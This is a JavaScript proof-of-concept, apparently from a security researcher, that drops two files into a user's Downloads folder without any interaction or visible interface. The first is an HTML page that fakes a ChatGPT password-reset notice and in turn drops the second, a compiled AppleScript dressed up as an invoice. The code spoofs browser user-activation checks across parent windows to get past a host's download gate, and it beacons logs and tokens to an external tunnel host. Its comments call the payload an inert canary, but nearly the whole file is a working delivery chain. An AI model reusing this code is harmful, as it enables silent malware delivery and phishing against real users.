/* T71-PART2 - SILENT DUAL-FILE DROPPER, ZERO UI (Pluto Security, inert canary).
   For the second demonstration video: the shared link is opened, NO app UI
   appears at all (the widget collapses to an invisible sliver), and TWO
   files land silently in ~/Downloads:
     load #1 -> "ChatGPT_Password_Reset_Required.pdf.html"  (reset-page look)
     ~3s later a single page reload re-arms the one-shot download
     load #2 -> "Invoice_2026.scpt"  (genuinely compiled AppleScript - the
                T72-proven path: opens in Script Editor with NO Gatekeeper
                prompt, executes after one Run press; inert Calculator demo)
   Both files are clearly-labeled inert canary pages that beacon to OUR OWN
   receiver when opened. Nothing real. The names are attacker-chosen
   curiosity bait - the demo point: files land with zero interaction. */
(function () {
  var SCPT_B64 = "RmFzZFVBUyAxLjEwMS4xMA4AAAAED///AAEAAgADAf//AAANAAEAAWsAAAAAAAAABAIABAACAAUABg0ABQADbAACAAAABQAH//7//Q0ABwADSQACAAAABf/8AAj/+wr//AAYLnN5c29leGVjVEVYVP//gAAAAAAAVEVYVA0ACAABbQAAAAAAAQAJDgAJAAGxAAoRAAoAJABvAHAAZQBuACAALQBhACAAQwBhAGwAYwB1AGwAYQB0AG8AcgL/+wAAAf/+AAAB//0AAAIABgACAAv/+g0ACwADbAACAAYAEQAM//n/+A0ADAADSQACAAYAEf/3AA0ADgr/9wAYLnN5c29kbG9nYXNrcgAAAAAAAAAAVEVYVA0ADQABbQAAAAYABwAPDgAPAAGxABARABAARgBUADcAMgAgAGMAYQBuAGEAcgB5ACAAKABpAG4AZQByAHQAKQAgAC0AIABQAGwAdQB0AG8AIABTAGUAYwB1AHIAaQB0AHkGAA4AA//2ABEAEgr/9gAECmJ0bnMNABEAAUoAAAAIAAsAEwIAEwACABT/9Q0AFAABbQAAAAgACQAVDgAVAAGxABYRABYABABPAEsC//UAAAYAEgAD//QAF//zCv/0AAQKZGZsdA0AFwABbQAAAAwADQAYDgAYAAGxABkRABkABABPAEsG//MAAAH/+QAAAf/4AAAC//oAAA4AAgAADxAAAwAD//IAGgAbAf/yAAAQABoAAf/xCv/xABguYWV2dG9hcHBudWxsAACAAAAAkAAqKioqDgAbAAcQ//AAHP/v/+4AHQAe/+0K//AAGC5hZXZ0b2FwcG51bGwAAIAAAACQACoqKioNABwAAWsAAAAAABEAHwIAHwACAAUAIAIAIAACAAv/7AL/7AAAAf/vAAAC/+4AABAAHQAAEAAeAAkACf/rAA//6gAV/+kAGP/o/+cK/+sAGC5zeXNvZXhlY1RFWFT//4AAAAAAAFRFWFQK/+oABApidG5zCv/pAAQKZGZsdAP/6AAECv/nABguc3lzb2Rsb2dhc2tyAAAAAAAAAABURVhUEf/tABLgagwAAU/i4+RrduXm5wwACA9hc2NyAAEADPre3q0=";
  var R = "https://consultant-casinos-generation-camel.trycloudflare.com/leak?d=";
  var EPOCH = 1792678200;
  /* invisible debug channel: every log line is also beaconed to the
     receiver dashboard (the UI is hidden in part 2, so the dashboard
     is the console) */
  var RLOG = "https://consultant-casinos-generation-camel.trycloudflare.com/leak?d=";
  function log(m) {
    try { console.log("[T71P2] " + m + " @" + Date.now()); } catch (e) {}
    try {
      var im = new Image();
      im.src = RLOG + encodeURIComponent("LOG|T71P2|" + String(m).slice(0, 120)) + "-" + Date.now();
    } catch (e2) {}
  }
  log("PART2 silent dual-drop, epoch " + EPOCH);

  /* spoof userActivation on every same-origin window (T11-proven; the
     host download interceptor's gate reads the runner realm) */
  function spoofChain() {
    var w = window, n = 0;
    for (var i = 0; i < 6; i++) {
      try {
        Object.defineProperty(w.navigator, "userActivation", {
          get: function () { return { isActive: true, hasBeenActive: true }; },
          configurable: true
        });
        n++;
      } catch (e) {}
      try { var p = w.parent; if (!p || p === w) break; w = p; } catch (e) { break; }
    }
    return n;
  }

  log("single-load dual-drop v4 (spoof " + spoofChain() + " windows)");

  function esc(s) { return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }

  var FILE1 = "ChatGPT_Password_Reset_Required.pdf.html";
  var FILE2 = "Invoice_2026.scpt";
  function buildFile2() { return FILE2; }

  function buildFile1() {
    var tok = "T71P2-" + EPOCH;
    /* file 1's page: the password-reset lure AND the self-dropper for
       file 2 (the compiled .scpt rides inside; a file:// page downloads
       silently - proven by the T50/T75 local batteries) */
    var html = [
      '<!DOCTYPE html><html><head><meta charset="utf-8"><title>Password reset required</title></head>',
      '<body style="font:14px -apple-system,Helvetica,Arial,sans-serif;background:#fff;color:#111;padding:24px;max-width:520px">',
      '<h2 style="font-weight:600">Password reset required</h2>',
      '<p style="color:#666">We detected a suspicious sign-in attempt on your account. A password reset is required within 24 hours. Your reset package has been saved to your Downloads folder.</p>',
      '<p style="color:#c00;font-size:11px;font-family:Menlo,monospace">PLUTO SECURITY RESEARCH CANARY - INERT - file 2 is written by this page (demo)</p>',
      '<pre id="out" style="font:11px Menlo,monospace"></pre>',
      '<script>',
      'var SCPT = "RmFzZFVBUyAxLjEwMS4xMA4AAAAED///AAEAAgADAf//AAANAAEAAWsAAAAAAAAABAIABAACAAUABg0ABQADbAACAAAABQAH//7//Q0ABwADSQACAAAABf/8AAj/+wr//AAYLnN5c29leGVjVEVYVP//gAAAAAAAVEVYVA0ACAABbQAAAAAAAQAJDgAJAAGxAAoRAAoAJABvAHAAZQBuACAALQBhACAAQwBhAGwAYwB1AGwAYQB0AG8AcgL/+wAAAf/+AAAB//0AAAIABgACAAv/+g0ACwADbAACAAYAEQAM//n/+A0ADAADSQACAAYAEf/3AA0ADgr/9wAYLnN5c29kbG9nYXNrcgAAAAAAAAAAVEVYVA0ADQABbQAAAAYABwAPDgAPAAGxABARABAARgBUADcAMgAgAGMAYQBuAGEAcgB5ACAAKABpAG4AZQByAHQAKQAgAC0AIABQAGwAdQB0AG8AIABTAGUAYwB1AHIAaQB0AHkGAA4AA//2ABEAEgr/9gAECmJ0bnMNABEAAUoAAAAIAAsAEwIAEwACABT/9Q0AFAABbQAAAAgACQAVDgAVAAGxABYRABYABABPAEsC//UAAAYAEgAD//QAF//zCv/0AAQKZGZsdA0AFwABbQAAAAwADQAYDgAYAAGxABkRABkABABPAEsG//MAAAH/+QAAAf/4AAAC//oAAA4AAgAADxAAAwAD//IAGgAbAf/yAAAQABoAAf/xCv/xABguYWV2dG9hcHBudWxsAACAAAAAkAAqKioqDgAbAAcQ//AAHP/v/+4AHQAe/+0K//AAGC5hZXZ0b2FwcG51bGwAAIAAAACQACoqKioNABwAAWsAAAAAABEAHwIAHwACAAUAIAIAIAACAAv/7AL/7AAAAf/vAAAC/+4AABAAHQAAEAAeAAkACf/rAA//6gAV/+kAGP/o/+cK/+sAGC5zeXNvZXhlY1RFWFT//4AAAAAAAFRFWFQK/+oABApidG5zCv/pAAQKZGZsdAP/6AAECv/nABguc3lzb2Rsb2dhc2tyAAAAAAAAAABURVhUEf/tABLgagwAAU/i4+RrduXm5wwACA9hc2NyAAEADPre3q0=";',
      'var FNAME = "' + FILE2 + '";',
      "function log(m){var o=document.getElementById('out');o.textContent+='\\n'+m;}",
      "log('opened as file:// at '+Date.now()+' (no warning shown)');",
      'try{',
      '  var bin=atob(SCPT);var b=new Uint8Array(bin.length);',
      '  for(var i=0;i<bin.length;i++)b[i]=bin.charCodeAt(i);',
      "  var blob=new Blob([b],{type:'application/x-applescript'});",
      '  var u=URL.createObjectURL(blob);',
      "  var a=document.createElement('a');a.href=u;a.download=FNAME;a.style.display='none';",
      '  document.body.appendChild(a);a.click();',
      '  setTimeout(function(){URL.revokeObjectURL(u);a.remove();},4000);',
      "  log('FILE 2 WRITTEN: '+FNAME+' - check Downloads');",
      "}catch(e){log('file2 ERR '+e.message);}",
      "try{fetch('" + R + "'+encodeURIComponent('" + tok + "|file1-page-active')+'-fetch').catch(function(){});}catch(e){}",
      '<\/script></body></html>'
    ].join("");
    return { name: FILE1, html: html };
  }

  function boot() {
    var d = document;
    /* part-2 v3: the playground UI STAYS visible (console panel = readable
       logs); this payload draws nothing itself */

    /* silent write via the host download bootstrap (T66-proven) */
    var f = buildFile1();
    try {
      var blob;
      if (false) {
        /* compiled AppleScript (T72-proven: quarantined .scpt opens in
           Script Editor with NO Gatekeeper prompt; inert Calculator demo) */
        var bin = atob(SCPT_B64);
        var bytes = new Uint8Array(bin.length);
        for (var k = 0; k < bin.length; k++) bytes[k] = bin.charCodeAt(k);
        blob = new Blob([bytes], { type: "application/x-applescript" });
      } else {
        blob = new Blob([f.html], { type: "text/html" });
      }
      var url = URL.createObjectURL(blob);
      var a = d.createElement("a");
      a.href = url;
      a.download = f.name;
      a.style.display = "none";
      d.body.appendChild(a);
      a.click();
      setTimeout(function () { URL.revokeObjectURL(url); a.remove(); }, 4000);
      log("WRITE FIRED: " + f.name);
    } catch (e) { log("write ERR " + e.message); }

    /* delayed direct attempt for file 2 on the SAME load (if the host
       interceptor is not truly one-shot, this lands it at zero clicks;
       the guaranteed path is file 1's own page dropping file 2 on open) */
    setTimeout(function () {
      log("attempting file 2 directly (same load)...");
      try {
        var f2 = buildFile2();
        var blob2;
        var bin = atob(SCPT_B64);
        var bytes = new Uint8Array(bin.length);
        for (var k = 0; k < bin.length; k++) bytes[k] = bin.charCodeAt(k);
        blob2 = new Blob([bytes], { type: "application/x-applescript" });
        var url2 = URL.createObjectURL(blob2);
        var a2 = d.createElement("a");
        a2.href = url2;
        a2.download = f2;
        a2.style.display = "none";
        d.body.appendChild(a2);
        a2.click();
        setTimeout(function () { URL.revokeObjectURL(url2); a2.remove(); }, 4000);
        log("WRITE 2 FIRED (direct attempt): " + f2 + " - check ~/Downloads");
      } catch (e) { log("direct file-2 ERR " + e.message); }
    }, 8000);
  }

  if (document.body) boot();
  else if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
  else { var iv = setInterval(function () { if (document.body) { clearInterval(iv); boot(); } }, 50); }
})();
